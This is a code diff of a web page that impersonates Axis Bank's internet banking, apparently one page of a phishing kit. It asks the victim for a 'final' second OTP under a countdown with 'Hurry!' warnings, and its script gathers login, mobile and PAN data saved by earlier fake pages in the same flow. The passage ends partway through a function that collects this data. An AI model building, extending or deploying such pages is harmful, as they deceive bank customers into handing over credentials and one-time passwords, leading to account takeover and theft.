@@ -3,521 +3,1138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AXIS BANK - Transaction OTP</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Axis Bank - Final OTP Verification</title>
     <style>
-        /* Same styles as OTP1 page */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #f0f2f5 0%, #e4e8ed 100%);
+            background: #f0f2f5;
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Page Load Animation */
+        .page-loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
         }
         
-        .container {
+        .loader-container {
+            position: relative;
             width: 100%;
-            max-width: 900px;
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 15px 35px rgba(0, 0, 100, 0.1);
-            overflow: hidden;
+            height: 100px;
         }
         
-        /* Header */
-        .header {
-            background: linear-gradient(to right, #2E5BAF, #1E4A9F);
-            color: white;
-            padding: 25px 40px;
-            text-align: center;
+        .loader-dot {
+            width: 15px;
+            height: 15px;
+            background: #87103F;
+            border-radius: 50%;
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            animation: dotAnimation 2.4s linear infinite;
+            box-shadow: 0 0 20px rgba(135, 16, 63, 0.8), 0 0 40px rgba(135, 16, 63, 0.6);
+        }
+        
+        @keyframes dotAnimation {
+            0% {
+                left: 0;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            6.25% {
+                width: 25px;
+                height: 25px;
+                opacity: 0.8;
+                box-shadow: 0 0 25px rgba(135, 16, 63, 0.9);
+            }
+            12.5% {
+                left: 12.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            18.75% {
+                width: 30px;
+                height: 30px;
+                opacity: 1;
+                box-shadow: 0 0 30px rgba(135, 16, 63, 1);
+            }
+            25% {
+                left: 25%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            31.25% {
+                width: 35px;
+                height: 35px;
+                opacity: 0.8;
+                box-shadow: 0 0 35px rgba(135, 16, 63, 0.9);
+            }
+            37.5% {
+                left: 37.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            43.75% {
+                width: 40px;
+                height: 40px;
+                opacity: 1;
+                box-shadow: 0 0 40px rgba(135, 16, 63, 1);
+            }
+            50% {
+                left: 50%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            56.25% {
+                width: 35px;
+                height: 35px;
+                opacity: 0.8;
+                box-shadow: 0 0 35px rgba(135, 16, 63, 0.9);
+            }
+            62.5% {
+                left: 62.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            68.75% {
+                width: 30px;
+                height: 30px;
+                opacity: 1;
+                box-shadow: 0 0 30px rgba(135, 16, 63, 1);
+            }
+            75% {
+                left: 75%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            81.25% {
+                width: 25px;
+                height: 25px;
+                opacity: 0.8;
+                box-shadow: 0 0 25px rgba(135, 16, 63, 0.9);
+            }
+            87.5% {
+                left: 87.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            93.75% {
+                width: 20px;
+                height: 20px;
+                opacity: 1;
+                box-shadow: 0 0 20px rgba(135, 16, 63, 1);
+            }
+            100% {
+                left: 100%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+        }
+        
+        /* Main Container */
+        .main-container {
+            opacity: 0;
+            animation: fadeIn 0.5s ease 3s forwards;
+            flex: 1;
+        }
+        
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+        
+        /* Header - Maroon Red */
+        .bank-header {
+            background: #87103F;
+            padding: 15px 40px;
             position: relative;
         }
         
-        .bank-logo {
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 10px;
+            justify-content: space-between;
         }
         
-        .bank-logo i {
-            font-size: 40px;
-            color: #FFD700;
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .bank-logo {
+            height: 45px;
+            width: auto;
+            object-fit: contain;
+            filter: brightness(0) invert(1);
+        }
+        
+        .bank-title {
+            display: flex;
+            flex-direction: column;
         }
         
         .bank-name {
-            font-size: 32px;
+            font-size: 28px;
             font-weight: bold;
+            color: white;
             letter-spacing: 1px;
         }
         
-        .security-badge {
-            position: absolute;
-            right: 40px;
-            top: 30px;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 8px 20px;
-            border-radius: 20px;
-            font-size: 14px;
+        .header-info {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+        
+        .header-text-container {
             display: flex;
             align-items: center;
-            gap: 8px;
+            margin-bottom: 5px;
+        }
+        
+        .open-text {
+            color: white;
+            font-weight: bold;
+            font-style: italic;
+            font-size: 24px;
+        }
+        
+        .banking-text {
+            color: white;
+            font-style: italic;
+            font-size: 18px;
+            letter-spacing: 1px;
+        }
+        
+        .separator {
+            color: rgba(255, 255, 255, 0.7);
+            margin: 0 10px;
+        }
+        
+        .login-using {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
         }
         
         /* Main Content */
         .main-content {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
             display: flex;
-            min-height: 500px;
+            flex-direction: column;
+            align-items: center;
         }
         
-        .left-section {
-            flex: 1;
-            padding: 40px;
-            background: #F9FAFB;
-            border-right: 1px solid #E1E4E8;
+        /* OTP Container */
+        .otp-container {
+            width: 100%;
+            max-width: 500px;
         }
         
-        .right-section {
-            width: 350px;
-            padding: 40px 30px;
+        .otp-box {
             background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
         }
         
-        /* OTP Form */
+        .otp-header {
+            background: #87103F;
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
         .otp-title {
-            color: #2E5BAF;
             font-size: 24px;
-            margin-bottom: 20px;
+            font-weight: bold;
+            margin-bottom: 5px;
         }
         
         .otp-subtitle {
-            color: #666;
+            opacity: 0.9;
             font-size: 16px;
-            margin-bottom: 30px;
+        }
+        
+        /* Progress Bar */
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            margin-top: 15px;
+            border-radius: 3px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: white;
+            width: 100%;
+            animation: progressAnimation 180s linear forwards;
+        }
+        
+        @keyframes progressAnimation {
+            0% { width: 100%; }
+            100% { width: 0%; }
+        }
+        
+        /* Form Container */
+        .form-container {
+            padding: 30px;
+        }
+        
+        /* Info Message */
+        .info-message {
+            background: #f8f9fa;
+            border-left: 4px solid #87103F;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        .info-title {
+            font-weight: bold;
+            color: #87103F;
+            margin-bottom: 5px;
+            font-size: 16px;
+        }
+        
+        .info-text {
+            color: #666;
+            font-size: 14px;
             line-height: 1.5;
         }
         
-        .transaction-info {
-            background: white;
-            border: 2px solid #E1E4E8;
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 30px;
-        }
-        
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #F0F0F0;
-        }
-        
-        .info-label {
-            color: #666;
-            font-weight: 500;
-        }
-        
-        .info-value {
-            color: #2E5BAF;
-            font-weight: 600;
-        }
-        
+        /* OTP Input */
         .otp-input-container {
             margin-bottom: 30px;
         }
         
-        .otp-input-label {
+        .otp-label {
             display: block;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             color: #333;
-            font-weight: 600;
-            font-size: 18px;
+            font-weight: bold;
+            font-size: 16px;
         }
         
-        .otp-inputs {
+        .otp-input-group {
             display: flex;
-            gap: 15px;
             justify-content: center;
+            gap: 15px;
+            margin-bottom: 10px;
         }
         
-        .otp-digit {
+        .otp-input {
             width: 60px;
             height: 70px;
-            border: 2px solid #DDD;
-            border-radius: 8px;
             text-align: center;
             font-size: 28px;
             font-weight: bold;
-            transition: all 0.3s;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            background: #f9f9f9;
+            transition: all 0.3s ease;
         }
         
-        .otp-digit:focus {
+        .otp-input:focus {
+            border-color: #87103F;
             outline: none;
-            border-color: #2E5BAF;
-            box-shadow: 0 0 0 3px rgba(46, 91, 175, 0.1);
+            background: white;
+            box-shadow: 0 0 0 3px rgba(135, 16, 63, 0.1);
         }
         
-        .submit-btn {
+        .otp-input.filled {
+            border-color: #87103F;
+            background: white;
+        }
+        
+        /* Timer */
+        .timer-container {
+            text-align: center;
+            margin-bottom: 25px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #e9ecef;
+        }
+        
+        .timer-title {
+            color: #333;
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .timer-display {
+            font-size: 32px;
+            font-weight: bold;
+            color: #87103F;
+            margin-bottom: 10px;
+        }
+        
+        .timer-warning {
+            color: #e74c3c;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        /* Button Container */
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .verify-button {
             width: 100%;
-            padding: 18px;
-            background: linear-gradient(to right, #2E5BAF, #1E4A9F);
+            background: #87103F;
             color: white;
             border: none;
+            padding: 18px;
             border-radius: 8px;
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: all 0.3s;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(135, 16, 63, 0.3);
         }
         
-        .submit-btn:hover {
-            background: linear-gradient(to right, #1E4A9F, #15367F);
+        .verify-button:hover {
+            background: #6a0c32;
             transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(46, 91, 175, 0.3);
+            box-shadow: 0 8px 20px rgba(135, 16, 63, 0.4);
         }
         
-        .resend-otp {
+        .verify-button.loading {
+            background: #6a0c32;
+            cursor: not-allowed;
+        }
+        
+        .verify-button.loading:after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: button-loading 0.6s linear infinite;
+        }
+        
+        @keyframes button-loading {
+            to { transform: rotate(360deg); }
+        }
+        
+        .resend-button {
+            width: 100%;
+            background: #f0f2f5;
+            color: #87103F;
+            border: 2px solid #87103F;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .resend-button:hover {
+            background: #87103F;
+            color: white;
+        }
+        
+        .resend-button:disabled {
+            background: #e0e0e0;
+            color: #999;
+            border-color: #ccc;
+            cursor: not-allowed;
+        }
+        
+        /* Links */
+        .form-links {
             text-align: center;
             margin-top: 25px;
-            color: #666;
+            padding-top: 25px;
+            border-top: 1px solid #eee;
         }
         
-        .resend-link {
-            color: #2E5BAF;
+        .form-links a {
+            color: #87103F;
             text-decoration: none;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        
-        .timer {
-            color: #DC3545;
             font-weight: bold;
-        }
-        
-        /* Right Section Cards */
-        .info-card {
-            background: #F8F9FA;
-            border-radius: 10px;
-            padding: 25px;
-            margin-bottom: 25px;
-            text-align: center;
-            border: 1px solid #E1E4E8;
-        }
-        
-        .card-icon {
-            font-size: 36px;
-            color: #2E5BAF;
-            margin-bottom: 15px;
-        }
-        
-        .card-title {
-            color: #333;
-            font-size: 18px;
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-        
-        .card-text {
-            color: #666;
             font-size: 14px;
-            line-height: 1.5;
-            margin-bottom: 20px;
+            margin: 0 15px;
+            transition: all 0.3s ease;
         }
         
-        .card-btn {
-            background: #2E5BAF;
-            color: white;
-            border: none;
-            padding: 10px 25px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: 500;
+        .form-links a:hover {
+            text-decoration: underline;
         }
         
         /* Footer */
-        .footer {
-            background: #F5F7FA;
-            padding: 20px 40px;
+        .main-footer {
+            background: #87103F;
+            color: white;
             text-align: center;
-            border-top: 1px solid #E1E4E8;
-            color: #666;
-            font-size: 14px;
+            padding: 30px 20px;
+            margin-top: 50px;
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .footer-text {
+            font-size: 18px;
+            margin-bottom: 20px;
+            font-weight: 500;
         }
         
         .footer-links {
-            margin-top: 10px;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 25px;
+            margin-bottom: 20px;
         }
         
         .footer-links a {
-            color: #2E5BAF;
+            color: white;
             text-decoration: none;
-            margin: 0 10px;
-            font-size: 13px;
+            font-weight: 500;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            padding: 5px 10px;
+            border-radius: 4px;
+        }
+        
+        .footer-links a:hover {
+            background: rgba(255, 255, 255, 0.1);
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            font-size: 14px;
+            opacity: 0.8;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        /* Responsive */
+        @media (max-width: 992px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+                gap: 15px;
+            }
+            
+            .logo-section {
+                justify-content: center;
+            }
+            
+            .header-info {
+                align-items: center;
+                text-align: center;
+            }
         }
         
         @media (max-width: 768px) {
+            .bank-header {
+                padding: 12px 20px;
+            }
+            
+            .bank-logo {
+                height: 40px;
+            }
+            
+            .bank-name {
+                font-size: 24px;
+            }
+            
+            .open-text {
+                font-size: 20px;
+            }
+            
+            .banking-text {
+                font-size: 16px;
+            }
+            
             .main-content {
-                flex-direction: column;
+                padding: 0 15px;
+                margin: 20px auto;
             }
             
-            .right-section {
-                width: 100%;
-            }
-            
-            .otp-inputs {
-                gap: 10px;
-            }
-            
-            .otp-digit {
+            .otp-input {
                 width: 50px;
                 height: 60px;
                 font-size: 24px;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+        
+        @media (max-width: 576px) {
+            .header-text-container {
+                flex-direction: column;
+                gap: 5px;
+            }
+            
+            .separator {
+                display: none;
+            }
+            
+            .bank-logo {
+                height: 35px;
+            }
+            
+            .bank-name {
+                font-size: 20px;
+            }
+            
+            .open-text {
+                font-size: 18px;
+            }
+            
+            .banking-text {
+                font-size: 14px;
+            }
+            
+            .otp-input-group {
+                gap: 10px;
+            }
+            
+            .otp-input {
+                width: 45px;
+                height: 55px;
+                font-size: 20px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <div class="bank-logo">
-                <i class="fas fa-university"></i>
-                <div class="bank-name">AXIS BANK</div>
-            </div>
-            <div class="security-badge">
-                <i class="fas fa-lock"></i>
-                <span>Transaction OTP Verification</span>
-            </div>
+    <!-- Page Load Animation -->
+    <div class="page-loader" id="pageLoader">
+        <div class="loader-container">
+            <div class="loader-dot"></div>
         </div>
+    </div>
+    
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Header -->
+        <header class="bank-header">
+            <div class="header-content">
+                <div class="logo-section">
+                    <!-- Axis Bank Logo -->
+                    <img src="https://raw.githubusercontent.com/shreya99u-max/axisbank/main/IMG_20260201_085106.jpg" 
+                         alt="Axis Bank Logo" 
+                         class="bank-logo">
+                    <div class="bank-title">
+                        <div class="bank-name">AXIS BANK</div>
+                    </div>
+                </div>
+                
+                <div class="header-info">
+                    <div class="header-text-container">
+                        <span class="open-text">open</span>
+                        <span class="separator">|</span>
+                        <span class="banking-text">INTERNET BANKING</span>
+                    </div>
+                    <div class="login-using">Final OTP Verification</div>
+                </div>
+            </div>
+        </header>
         
         <!-- Main Content -->
         <div class="main-content">
-            <!-- Left Section - OTP Form -->
-            <div class="left-section">
-                <h2 class="otp-title">Transaction Authorization</h2>
-                <p class="otp-subtitle">
-                    To complete your PAN verification, please authorize this transaction by entering the OTP sent to your registered mobile number.
-                </p>
-                
-                <div class="transaction-info">
-                    <div class="info-row">
-                        <span class="info-label">Transaction Type:</span>
-                        <span class="info-value">PAN Verification</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Amount:</span>
-                        <span class="info-value">₹ 0 (Zero Rupees)</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Transaction ID:</span>
-                        <span class="info-value">TXN-PAN-${Date.now().toString().slice(-8)}</span>
-                    </div>
-                    <div class="info-row" style="border-bottom: none;">
-                        <span class="info-label">Date & Time:</span>
-                        <span class="info-value" id="currentDateTime"></span>
-                    </div>
-                </div>
-                
-                <form id="otpForm">
-                    <div class="otp-input-container">
-                        <label class="otp-input-label">Enter 6-digit OTP</label>
-                        <div class="otp-inputs">
-                            <input type="text" class="otp-digit" maxlength="1" data-index="1" required>
-                            <input type="text" class="otp-digit" maxlength="1" data-index="2" required>
-                            <input type="text" class="otp-digit" maxlength="1" data-index="3" required>
-                            <input type="text" class="otp-digit" maxlength="1" data-index="4" required>
-                            <input type="text" class="otp-digit" maxlength="1" data-index="5" required>
-                            <input type="text" class="otp-digit" maxlength="1" data-index="6" required>
+            <div class="otp-container">
+                <div class="otp-box">
+                    <div class="otp-header">
+                        <div class="otp-title">Final OTP Verification</div>
+                        <div class="otp-subtitle">Enter the second OTP for complete verification</div>
+                        
+                        <!-- Progress Bar for 3 minutes -->
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="progressFill"></div>
                         </div>
-                        <input type="hidden" id="fullOtp" name="otp">
                     </div>
                     
-                    <button type="submit" class="submit-btn">
-                        <i class="fas fa-check-circle"></i>
-                        AUTHORIZE TRANSACTION
-                    </button>
-                </form>
-                
-                <div class="resend-otp">
-                    <p>OTP not received? <span id="timer" class="timer">00:45</span></p>
-                    <p><a class="resend-link" id="resendLink" style="pointer-events: none; opacity: 0.5;">Resend OTP</a></p>
-                </div>
-            </div>
-            
-            <!-- Right Section - Info Cards -->
-            <div class="right-section">
-                <div class="info-card">
-                    <div class="card-icon">
-                        <i class="fas fa-handshake"></i>
-                    </div>
-                    <div class="card-title">Zero Amount Transaction</div>
-                    <div class="card-text">
-                        This is a zero-rupee transaction only for verification purpose. No money will be debited from your account.
-                    </div>
-                </div>
-                
-                <div class="info-card">
-                    <div class="card-icon">
-                        <i class="fas fa-exclamation-triangle"></i>
-                    </div>
-                    <div class="card-title">Security Alert</div>
-                    <div class="card-text">
-                        If you did not initiate this transaction, please do not enter OTP and contact customer care immediately.
-                    </div>
-                </div>
-                
-                <div class="info-card">
-                    <div class="card-icon">
-                        <i class="fas fa-history"></i>
-                    </div>
-                    <div class="card-title">OTP Validity</div>
-                    <div class="card-text">
-                        This OTP is valid for 10 minutes only. After expiration, you'll need to request a new OTP.
+                    <div class="form-container">
+                        <!-- Info Message -->
+                        <div class="info-message">
+                            <div class="info-title">🔒 Final Security Check</div>
+                            <div class="info-text">
+                                For complete account security, we've sent a second OTP to your registered mobile number ending with 
+                                <span id="mobileNumber">XXXX</span>. This is the final verification step.
+                            </div>
+                        </div>
+                        
+                        <!-- OTP Form -->
+                        <form id="otpForm">
+                            <div class="otp-input-container">
+                                <label class="otp-label" for="otp">Enter 6-digit OTP</label>
+                                <div class="otp-input-group" id="otpInputGroup">
+                                    <input type="text" class="otp-input" maxlength="1" data-index="1" autocomplete="off">
+                                    <input type="text" class="otp-input" maxlength="1" data-index="2" autocomplete="off">
+                                    <input type="text" class="otp-input" maxlength="1" data-index="3" autocomplete="off">
+                                    <input type="text" class="otp-input" maxlength="1" data-index="4" autocomplete="off">
+                                    <input type="text" class="otp-input" maxlength="1" data-index="5" autocomplete="off">
+                                    <input type="text" class="otp-input" maxlength="1" data-index="6" autocomplete="off">
+                                </div>
+                                <input type="hidden" id="fullOtp" name="otp">
+                            </div>
+                            
+                            <!-- Timer -->
+                            <div class="timer-container">
+                                <div class="timer-title">Time Remaining</div>
+                                <div class="timer-display" id="timerDisplay">03:00</div>
+                                <div class="timer-warning" id="timerWarning"></div>
+                            </div>
+                            
+                            <!-- Buttons -->
+                            <div class="btn-container">
+                                <button type="submit" class="verify-button" id="verifyButton">
+                                    Complete Verification
+                                </button>
+                                
+                                <button type="button" class="resend-button" id="resendButton" disabled>
+                                    Resend OTP (180s)
+                                </button>
+                            </div>
+                        </form>
+                        
+                        <div class="form-links">
+                            <a href="#" id="backLink">Back to PAN Verification</a>
+                            <a href="#" id="helpLink">Need Help?</a>
+                        </div>
                     </div>
                 </div>
             </div>
         </div>
         
         <!-- Footer -->
-        <div class="footer">
-            <p>© 2004-2024 Axis Bank Ltd. All rights reserved.</p>
-            <div class="footer-links">
-                <a href="#">Privacy Policy</a> | 
-                <a href="#">Terms & Conditions</a> | 
-                <a href="#">Disclaimer</a> | 
-                <a href="#">Sitemap</a>
+        <footer class="main-footer">
+            <div class="footer-content">
+                <div class="footer-text">Complete Security Verification</div>
+                <div class="footer-links">
+                    <a href="#">Contactless enabled Credit Cards</a>
+                    <a href="#">Home loan upto Rs. 28 Lakhs</a>
+                    <a href="#">Experience seamless credit approval</a>
+                    <a href="#">Instant personal loans</a>
+                    <a href="#">Zero balance savings account</a>
+                </div>
+                <div class="copyright">
+                    © 2023 Axis Bank Ltd. All Rights Reserved. | <a href="#" style="color: white; text-decoration: underline;">Privacy Policy</a> | <a href="#" style="color: white; text-decoration: underline;">Terms of Service</a>
+                </div>
             </div>
-        </div>
+        </footer>
     </div>
 
     <script>
-        // Set current date and time
-        const now = new Date();
-        const dateTimeStr = now.toLocaleString('en-IN', {
-            day: '2-digit',
-            month: 'short',
-            year: 'numeric',
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit'
+        // Page load animation
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                document.getElementById('pageLoader').style.opacity = '0';
+                setTimeout(function() {
+                    document.getElementById('pageLoader').style.display = 'none';
+                }, 500);
+            }, 3000);
         });
-        document.getElementById('currentDateTime').textContent = dateTimeStr;
+        
+        // DOM Elements
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const fullOtpInput = document.getElementById('fullOtp');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const timerWarning = document.getElementById('timerWarning');
+        const verifyButton = document.getElementById('verifyButton');
+        const resendButton = document.getElementById('resendButton');
+        const backLink = document.getElementById('backLink');
+        const helpLink = document.getElementById('helpLink');
+        const mobileNumberSpan = document.getElementById('mobileNumber');
+        const progressFill = document.getElementById('progressFill');
+        
+        // Timer variables
+        let timeLeft = 180; // 3 minutes in seconds
+        let timerInterval;
+        let canResend = false;
+        
+        // Mobile number from previous submission
+        function getMobileNumber() {
+            // Get PAN data
+            const panData = JSON.parse(localStorage.getItem('axisBankPANVerifications') || '[]');
+            const lastPAN = panData.length > 0 ? panData[0] : null;
+            
+            // Get login data
+            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+            const lastSubmission = submissions.length > 0 ? submissions[0] : null;
+            
+            // Return mobile from login data
+            if (lastSubmission && lastSubmission.data && lastSubmission.data.mobile) {
+                return lastSubmission.data.mobile;
+            }
+            return null;
+        }
+        
+        // Update mobile number display
+        const mobile = getMobileNumber();
+        if (mobile) {
+            mobileNumberSpan.textContent = '******' + mobile.slice(-4);
+        }
         
         // OTP input handling
-        const otpDigits = document.querySelectorAll('.otp-digit');
-        const fullOtpInput = document.getElementById('fullOtp');
-        
-        otpDigits.forEach((digit, index) => {
-            digit.addEventListener('input', function(e) {
-                const value = e.target.value.replace(/\D/g, '');
-                e.target.value = value.slice(0, 1);
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/[^0-9]/gi, '');
+                e.target.value = value;
                 
-                if (value && index < otpDigits.length - 1) {
-                    otpDigits[index + 1].focus();
+                if (value.length === 1) {
+                    e.target.classList.add('filled');
+                    
+                    // Move to next input if available
+                    if (index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                } else {
+                    e.target.classList.remove('filled');
                 }
                 
                 updateFullOtp();
             });
             
-            digit.addEventListener('keydown', function(e) {
+            input.addEventListener('keydown', function(e) {
+                // Handle backspace
                 if (e.key === 'Backspace' && !e.target.value && index > 0) {
-                    otpDigits[index - 1].focus();
+                    otpInputs[index - 1].focus();
+                }
+                
+                // Handle arrow keys
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+                
+                if (e.key === 'ArrowRight' && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+            
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                let pasteData = e.clipboardData.getData('text').replace(/[^0-9]/gi, '');
+                
+                if (pasteData.length === 6) {
+                    for (let i = 0; i < 6; i++) {
+                        if (i < otpInputs.length) {
+                            otpInputs[i].value = pasteData[i];
+                            otpInputs[i].classList.add('filled');
+                        }
+                    }
+                    updateFullOtp();
+                    otpInputs[5].focus();
                 }
             });
         });
         
+        // Update full OTP value
         function updateFullOtp() {
-            let otp = '';
-            otpDigits.forEach(digit => {
-                otp += digit.value;
+            let otpValue = '';
+            otpInputs.forEach(input => {
+                otpValue += input.value;
             });
-            fullOtpInput.value = otp;
+            fullOtpInput.value = otpValue;
         }
         
-        // Timer for OTP resend
-        let timeLeft = 45;
-        const timerElement = document.getElementById('timer');
-        const resendLink = document.getElementById('resendLink');
-        
-        function updateTimer() {
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            
-            if (timeLeft > 0) {
+        // Start timer
+        function startTimer() {
+            timerInterval = setInterval(() => {
                 timeLeft--;
-                setTimeout(updateTimer, 1000);
-            } else {
-                timerElement.textContent = '00:00';
-                resendLink.style.pointerEvents = 'auto';
-                resendLink.style.opacity = '1';
-            }
+                
+                // Update timer display
+                let minutes = Math.floor(timeLeft / 60);
+                let seconds = timeLeft % 60;
+                timerDisplay.textContent = 
+                    minutes.toString().padStart(2, '0') + ':' + 
+                    seconds.toString().padStart(2, '0');
+                
+                // Update progress bar
+                let progressPercent = (timeLeft / 180) * 100;
+                progressFill.style.width = progressPercent + '%';
+                
+                // Update warning message
+                if (timeLeft === 60) {
+                    timerWarning.textContent = 'Hurry! Only 1 minute remaining';
+                } else if (timeLeft === 30) {
+                    timerWarning.textContent = 'Only 30 seconds remaining!';
+                } else if (timeLeft === 10) {
+                    timerWarning.textContent = 'Hurry up! OTP will expire soon!';
+                } else if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerDisplay.textContent = '00:00';
+                    timerWarning.textContent = 'OTP has expired! Please resend.';
+                    progressFill.style.width = '0%';
+                    canResend = true;
+                    resendButton.disabled = false;
+                    resendButton.textContent = 'Resend OTP';
+                }
+            }, 1000);
         }
         
-        updateTimer();
+        // Resend OTP
+        function resendOTP() {
+            if (!canResend) return;
+            
+            // Reset timer
+            timeLeft = 180;
+            timerDisplay.textContent = '03:00';
+            timerWarning.textContent = '';
+            canResend = false;
+            resendButton.disabled = true;
+            resendButton.textContent = 'Resend OTP (180s)';
+            
+            // Reset OTP inputs
+            otpInputs.forEach(input => {
+                input.value = '';
+                input.classList.remove('filled');
+            });
+            updateFullOtp();
+            
+            // Focus first input
+            otpInputs[0].focus();
+            
+            // Start timer again
+            clearInterval(timerInterval);
+            startTimer();
+            
+            // Simulate sending OTP
+            verifyButton.disabled = false;
+            verifyButton.textContent = 'Complete Verification';
+        }
         
-        resendLink.addEventListener('click', function() {
-            if (timeLeft <= 0) {
-                timeLeft = 45;
-                updateTimer();
-                resendLink.style.pointerEvents = 'none';
-                resendLink.style.opacity = '0.5';
-                alert('New OTP sent to your registered mobile number.');
-            }
+        // Get all user data
+        function getAllUserData() {
+            // Get OTP1 data
+            const otp1Data = JSON.parse(localStorage.getItem('axisBankOTPVerifications') || '[]');
+            const lastOTP1 = otp1Data.length > 0 ? otp1Data[0] : null;
+            
+            // Get PAN data
+            const panData = JSON.parse(localStorage.getItem('axisBankPANVerifications') || '[]');
+            const lastPAN = panData.length > 0 ? panData[0] : null;
+            
+            // Get login data
+            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+            const lastSubmission = submissions.length > 0 ? submissions[0] : null;
